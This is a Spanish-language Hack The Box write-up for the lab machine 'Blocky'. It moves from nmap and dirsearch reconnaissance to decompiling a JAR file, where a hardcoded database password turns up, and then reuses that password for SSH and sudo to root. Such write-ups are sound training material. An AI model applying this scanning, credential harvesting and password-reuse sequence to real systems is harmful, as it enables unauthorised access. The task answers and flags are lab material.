---
title: Blocky
date: 2025-12-31 18:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, blocky ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/f412784c311bdf52c3655381d2c9cd21.png
    alt: Hack The Box
---

> Blocky
Linux · Easy 

## Task 1

What is the name of the FTP software running on Blocky?

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ nmap -p- -sCVS -T 5 --min-rate 5000 10.129.29.193
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-31 14:55 CET
Nmap scan report for 10.129.29.193
Host is up (0.044s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE  SERVICE   VERSION
21/tcp    open   ftp?
22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp    open   http      Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://blocky.htb
8192/tcp  closed sophos
25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 266.82 seconds
```
Nmap no consigue obtener la versión.

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ ftp 10.129.29.193

Connected to 10.129.29.193.
ls
220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.129.29.193]
Name (10.129.29.193:pmartinezr): 331 Password required for ls
Password: 
```

Pruebo a conectarme al servidor y lanzar un comando. 

> ProFTPD


## Task 2

What username is given by enumerating the website?

Antes de nada incluimos en ```/etc/hosts```la dirección de la máquina para facilitar la resolución. 
Aparece una web en ```http://blocky.htb/``` Wappalizer nos dice que es un ```Wordpress 4.8```

```
BlockyCraft

Under Construction!
```

Visito el enlace ```http://blocky.htb/index.php/2017/07/02/welcome-to-blockycraft/``` 

``` 
Posted on July 2, 2017 by Notch
``` 

aparece un usuario ```Notch```

> Notch

## Task 3

What relative path on the webserver offers two JAR files for download?

http://blocky.htb/index.php/author/notch/

Sin embargo ```http://blocky.htb/wp-admin``` nos redirige a la página de login de Wordpress. 


``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ dirsearch -u http://blocky.htb
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/pmartinezr/reports/http_blocky.htb/_26-01-01_18-50-41.txt

Target: http://blocky.htb/

[18:50:41] Starting: 
[18:50:45] 403 -  296B  - /.ht_wsr.txt                                      
[18:50:46] 403 -  299B  - /.htaccess.bak1                                   
[18:50:46] 403 -  299B  - /.htaccess.orig
[18:50:46] 403 -  301B  - /.htaccess.sample                                 
[18:50:46] 403 -  299B  - /.htaccess.save
[18:50:46] 403 -  299B  - /.htaccess_orig
[18:50:46] 403 -  300B  - /.htaccess_extra                                  
[18:50:46] 403 -  297B  - /.htaccessBAK
[18:50:46] 403 -  297B  - /.htaccessOLD
[18:50:46] 403 -  298B  - /.htaccessOLD2
[18:50:46] 403 -  297B  - /.htaccess_sc                                     
[18:50:46] 403 -  289B  - /.htm                                             
[18:50:46] 403 -  290B  - /.html                                            
[18:50:46] 403 -  299B  - /.htpasswd_test                                   
[18:50:46] 403 -  296B  - /.httr-oauth
[18:50:46] 403 -  295B  - /.htpasswds
[18:50:47] 403 -  290B  - /.php3                                            
[18:50:47] 403 -  289B  - /.php                                             
[18:51:36] 404 -   48KB - /index.php/login/                                 
[18:51:37] 301 -  313B  - /javascript  ->  http://blocky.htb/javascript/    
[18:51:42] 301 -    0B  - /index.php  ->  http://blocky.htb/                
[18:51:48] 200 -    7KB - /license.txt                                      
[18:51:59] 301 -  313B  - /phpmyadmin  ->  http://blocky.htb/phpmyadmin/    
[18:52:07] 301 -  310B  - /plugins  ->  http://blocky.htb/plugins/          
[18:52:09] 200 -  409B  - /plugins/                                         
[18:52:13] 200 -    3KB - /phpmyadmin/doc/html/index.html                   
[18:52:15] 200 -    3KB - /phpmyadmin/                                      
[18:52:15] 200 -    3KB - /phpmyadmin/index.php                             
[18:52:20] 200 -    3KB - /readme.html                                      
[18:52:22] 403 -  299B  - /server-status/                                   
[18:52:22] 403 -  298B  - /server-status                                    
[18:52:37] 301 -  307B  - /wiki  ->  http://blocky.htb/wiki/                
[18:52:37] 200 -  256B  - /wiki/                                            
[18:52:37] 301 -  311B  - /wp-admin  ->  http://blocky.htb/wp-admin/        
[18:52:37] 500 -    4KB - /wp-admin/setup-config.php                        
[18:52:37] 200 -    0B  - /wp-config.php                                    
[18:52:38] 200 -  531B  - /wp-admin/install.php                             
[18:52:38] 301 -  313B  - /wp-content  ->  http://blocky.htb/wp-content/    
[18:52:38] 200 -    0B  - /wp-content/                                      
[18:52:38] 500 -    0B  - /wp-content/plugins/hello.php                     
[18:52:39] 200 -   84B  - /wp-content/plugins/akismet/akismet.php           
[18:52:39] 301 -  314B  - /wp-includes  ->  http://blocky.htb/wp-includes/  
[18:52:39] 500 -    0B  - /wp-includes/rss-functions.php
[18:52:39] 200 -    0B  - /wp-cron.php                                      
[18:52:39] 302 -    0B  - /wp-signup.php  ->  http://blocky.htb/wp-login.php?action=register
[18:52:40] 200 -  453B  - /wp-content/uploads/                              
[18:52:41] 200 -    1KB - /wp-login.php                                     
[18:52:42] 405 -   42B  - /xmlrpc.php                                       
[18:52:45] 302 -    0B  - /wp-admin/  ->  http://blocky.htb/wp-login.php?redirect_to=http%3A%2F%2Fblocky.htb%2Fwp-admin%2F&reauth=1
[18:52:45] 200 -    1B  - /wp-admin/admin-ajax.php
[18:53:15] 200 -    4KB - /wp-includes/

Task Completed      
```

Por una parte tenemos el ```wp-login``` y el ```phpmyadmin``` también parece que hay una ```wiki``` bajo construcción.

Nos preguntan por un path así que debemos recorrer los encontrados hasta dar con alguna pista.

En el directorio plugins nos encontraremos dos archivos ```http://blocky.htb/plugins/``` ``` BlockyCore.jar``` y ```griefprevention-1.11.2-3.1.1.298.jar```

> /plugins 

## Task 4

What password is present in the BlockCore.jar file?

```java
    package com.myfirstplugin;

public class BlockyCore {
   public String sqlHost = "localhost";
   public String sqlUser = "root";
   public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";

   public void onServerStart() {
   }

   public void onServerStop() {
   }

   public void onPlayerJoin() {
      this.sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
   }

   public void sendMessage(String username, String message) {
   }
}
```

Usando esta herramienta online [https://www.decompiler.com/](https://www.decompiler.com/) decompilo el archivo ```BlockyCore.jar java``` y obtengo una password ```8YsqfCTnvxAUeduzjNSXe22```esta debería ser la password de entrada a mysqladmin.

> 8YsqfCTnvxAUeduzjNSXe22

## Submit User Flag

Submit the flag located in the notch user's home directory.


Se puede entrar al panel de phpmyadmin con esa password y podemos modificar los datos puediendo modificar el usuario o añadir otro
o cambiar el correo de ```notch@blockcraftfake.com``` pero no es necesario, es otro caso más de password reutilizado. 


``` shell
┌──(pmartinezr㉿kali)-[~/htb/blocky]
└─$ ssh notch@blocky.htb   
The authenticity of host 'blocky.htb (10.129.29.193)' can't be established.
ED25519 key fingerprint is: SHA256:ZspC3hwRDEmd09Mn/ZlgKwCv8I8KDhl9Rt2Us0fZ0/8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'blocky.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
notch@blocky.htb's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Fri Jul  8 07:24:50 2022 from 10.10.14.29
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

Reutilizo la password y entramos por SSH.

```shell
notch@Blocky:~$ cat user.txt 
d6634294436facf************
```

> d6634294436facf************

## Task 6

Is notch able to run sudo -i and get a shell as root?

``` shell
notch@Blocky:~$ sudo -i
[sudo] password for notch: 
root@Blocky:~# 
```

> yes 

## Submit Root Flag

Submit the flag located in root's home directory.

``` shell
root@Blocky:~# cat root.txt 
e9ef95edb9d94ea************
```

> e9ef95edb9d94ea************

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/48)